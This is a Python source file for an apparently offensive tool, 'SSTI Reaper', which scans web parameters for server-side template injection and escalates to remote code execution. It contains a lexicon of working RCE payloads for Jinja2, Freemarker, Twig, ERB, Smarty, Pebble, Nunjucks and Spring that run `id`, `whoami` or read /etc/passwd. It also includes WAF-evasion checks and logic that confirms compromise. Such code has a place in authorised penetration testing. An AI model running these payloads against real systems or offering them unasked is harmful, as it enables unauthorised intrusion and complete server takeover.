# -*- coding: utf-8 -*-
"""
Aura v34.0 — SSTI Reaper (Direct Execution & RCE) 🧨
====================================================
Advanced Server-Side Template Injection engine.
Targets deep structural flaws in template rendering engines to achieve RCE.

Supported Engines & Payloads:
  - Jinja2 / MRO escapes
  - Freemarker / Java RCE
  - Twig / PHP Execution
  - Ruby ERB / System evaluation
  - NodeJS / Nunjucks bypasses

Strategy:
  1. Discovery: Math injection (e.g., {{7*7}}, ${7*7}) with Anti-WAF checking.
  2. Escalation: Inject specific classes/methods to break out of the sandbox.
  3. Execution: Send non-destructive OS commands (`id`, `whoami`) to confirm RCE.
"""

import asyncio
import json
import random
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests
from rich.console import Console

console = Console()

# ── Payload Lexicon ──────────────────────────────────────────────────────────

# Discovery Phase: Mathematical evaluation probes
SSTI_PROBES = [
    ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
    ("${7*7}", "49", "Freemarker/Spring/Groovy"),
    ("#{7*7}", "49", "Thymeleaf/Ruby"),
    ("<%= 7*7 %>", "49", "ERB/Ruby"),
    ("{{7*'7'}}", "7777777", "Jinja2"),       # String reflection vs Math
    ("${{7*7}}", "49", "Pebble"),
    ("{7*7}", "49", "Smarty"),
    ("{php}echo 7*7;{/php}", "49", "Smarty PHP"),
    ("@(7*7)", "49", "Razor/.NET"),
    ("*{7*7}", "49", "Spring Expression"),
    ("[[${7*7}]]", "49", "Thymeleaf"),
]

# Escalation Phase: OS Execution & RCE payloads targeting `id` and `whoami`
SSTI_RCE_PROBES = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{% import os %}{{ os.popen('whoami').read() }}"
    ],
    "Freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
    ],
    "ERB": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= File.read('/etc/passwd') %>"
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    "Smarty": [
        "{system('id')}",
        "{php}system('id');{/php}",
    ],
    "Pebble": [
        "{% set cmd = 'id' %}{{ runtime.exec(cmd) }}",
    ],
    "Nunjucks": [
        "{{range.constructor(\\'return global.process.mainModule.require(\"child_process\").execSync(\"id\")\\')()}}"
    ],
    "Spring": [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ]
}

# Signatures for successful execution
RCE_CONFIRM_PATTERN = re.compile(r'(uid=\d+\(.*?\)|root:x:0:0|root$)', re.IGNORECASE | re.MULTILINE)
WAF_SIGS = ["cloudflare", "attention required", "ray id", "security challenge", 
            "captcha", "blocked", "incident id", "firewall", "403 forbidden"]


class SSTIReaper:
    """v34.0: Code Execution & Template Injection Hunter."""

    def __init__(self, target: str, cookies_str: str = "", output_dir: str = "./reports", timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.findings: list[dict] = []

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in (cookie_str or "").split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    async def _async_request(self, method: str, url: str, data: dict = None) -> requests.Response | None:
        """Sends an async request using curl_cffi/requests (wrapper for event loop)."""
        def fetch():
            try:
                if method == "GET":
                    return requests.get(url, params=data, cookies=self.cookies, timeout=self.timeout, verify=False)
                else:
                    return requests.post(url, data=data, cookies=self.cookies, timeout=self.timeout, verify=False)
            except Exception:
                return None
        return await asyncio.to_thread(fetch)

    def _extract_injectable_targets(self, discovery_map: dict) -> list[dict]:
        """Extracts parameters likely vulnerable to SSTI."""
        all_calls = (
            discovery_map.get("all_api_calls", []) +
            discovery_map.get("idor_candidates", []) +
            discovery_map.get("mutating_endpoints", [])
        )
        
        injectable = []
        seen = set()

        for call in all_calls:
            url = call.get("url", "")
            if not url: continue
            
            # Extract query params
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param_name in params:
                key = (parsed.path, param_name, "GET")
                if key not in seen:
                    seen.add(key)
                    injectable.append({"url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}", "method": "GET", "param": param_name})
                    
            # Extract body params if applicable (simplified generic extraction)
            method = call.get("method", "GET")
            if method in ["POST", "PUT"]:
                # Just dummy param injecting for proof of concept
                key = (parsed.path, "q", "POST")
                if key not in seen:
                    seen.add(key)
                    injectable.append({"url": url, "method": "POST", "param": "q"})
                    injectable.append({"url": url, "method": "POST", "param": "template"})
                    injectable.append({"url": url, "method": "POST", "param": "name"})

        return injectable

    async def _probe_discovery(self, target_info: dict) -> dict | None:
        """Phase 1: Generates dynamic math payloads to detect SSTI with WAF aversion."""
        url = target_info["url"]
        method = target_info["method"]
        param = target_info["param"]

        for probe_template, expected_const, engine in SSTI_PROBES:
            # Dynamic math to bypass cached responses or simple string matching
            a, b = random.randint(10, 99), random.randint(10, 99)
            dynamic_expected = str(a * b)
            
            # Some templates don't use Math, like the Jinja2 String Multiplier {{7*'7'}}
            if probe_template == "{{7*'7'}}":
                probe = probe_template
                expected = expected_const
            else:
                probe = probe_template.replace("7*7", f"{a}*{b}")
                expected = dynamic_expected

            data = {param: probe}
            resp = await self._async_request(method, url, data)
            
            if resp and resp.status_code in [200, 500]:
                text = resp.text.lower()
                
                # WAF/Reflection check
                if expected in text:
                    if any(sig in text for sig in WAF_SIGS):
                        continue # WAF block

                    # Strict Reflection Check (if input literal is in output, it's not a math eval)
                    if probe.lower() in text and expected != "7777777":
                        continue
                        
                    return {
                        "url": url,
                        "method": method,
                        "param": param,
                        "probe": probe,
                        "engine": engine,
                        "snippet": resp.text[:400].strip()
                    }
        return None

    async def _escalate_rce(self, discovery_hit: dict) -> str | None:
        """Phase 2: Use specific RCE payloads based on engine fingerprint."""
        engine_hint = discovery_hit["engine"]
        url = discovery_hit["url"]
        method = discovery_hit["method"]
        param = discovery_hit["param"]

        engines_to_test = [e.strip() for e in engine_hint.split("/")]
        
        for engine in engines_to_test:
            payloads = SSTI_RCE_PROBES.get(engine, SSTI_RCE_PROBES["Jinja2"]) # Fallback to Jinja2
            
            for payload in payloads:
                data = {param: payload}
                resp = await self._async_request(method, url, data)
                
                if resp:
                    match = RCE_CONFIRM_PATTERN.search(resp.text)
                    if match:
                        return f"RCE Confirmed ({engine}): `{match.group(0)}` | Payload: {payload}"
        return None

    # ── Main Scanner Logic ──────────────────────────────────────────────
    async def run(self, discovery_map: dict) -> list[dict]:
        console.print(f"\n[bold magenta]🧨 AURA v34.0 — SSTI Reaper[/bold magenta]")
        console.print(f"🎯 Target: {self.target}")

        targets = self._extract_injectable_targets(discovery_map)
        
        if not targets:
            common_params = ["q", "name", "id", "search", "template", "view"]
            for p in common_params:
                targets.append({"url": self.target, "method": "GET", "param": p})

        console.print(f"  [cyan]Analyzing {len(targets)} parameters for Server-Side Template Injection...[/cyan]")

        # 1. Discovery
        discovery_tasks = [self._probe_discovery(t) for t in targets]
        results = await asyncio.gather(*discovery_tasks, return_exceptions=True)
        
        for hit in results:
            if hit and not isinstance(hit, Exception):
                engine = hit["engine"]
                
                console.print(f"     ✅ [cyan]SSTI Discovered:[/cyan] {engine} on '{hit['param']}'")
                
                # 2. Escalation (RCE)
                rce_result = await self._escalate_rce(hit)
                
                severity = "CRITICAL" if rce_result else "HIGH"
                impact = "Remote Code Execution (RCE). Complete Server Takeover." if rce_result else "Data exposure and server compromise via Template Injection."
                
                item = {
                    "type": f"Server-Side Template Injection ({engine})",
                    "url": hit["url"],
                    "param": hit["param"],
                    "severity": severity,
                    "impact": impact,
                    "evidence": rce_result or f"Math injection succeeded: {hit['probe']} evaluated.",
                    "snippet": hit["snippet"],
                    "confirmed": True
                }
                
                if rce_result:
                    console.print(f"     💥 [bold red]RCE ACHIVED![/bold red] {rce_result}")
                
                # Check deduplication
                key = f"{hit['url']}_{hit['param']}"
                if not any(f["url"] == hit["url"] and f["param"] == hit["param"] for f in self.findings):
                    self.findings.append(item)

        self._finalize_report()
        return self.findings

    def _finalize_report(self):
        if self.findings:
            target_slug = urllib.parse.urlparse(self.target).netloc.replace(".", "_")
            out_path = self.output_dir / f"ssti_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target,
                    "scan_time": datetime.utcnow().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            console.print(f"\n  💾 SSTI Findings saved: {out_path}")
        else:
            console.print(f"\n  ✅ No SSTI vulnerabilities detected.")


def run_ssti_scan(target: str):
    """CLI runner for direct execution."""
    # dummy map
    engine = SSTIReaper(target=target)
    dummy_map = {
         "all_api_calls": [{"url": target + "?name=test", "method": "GET"}]
    }
    return asyncio.run(engine.run(dummy_map))

if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    run_ssti_scan(url)
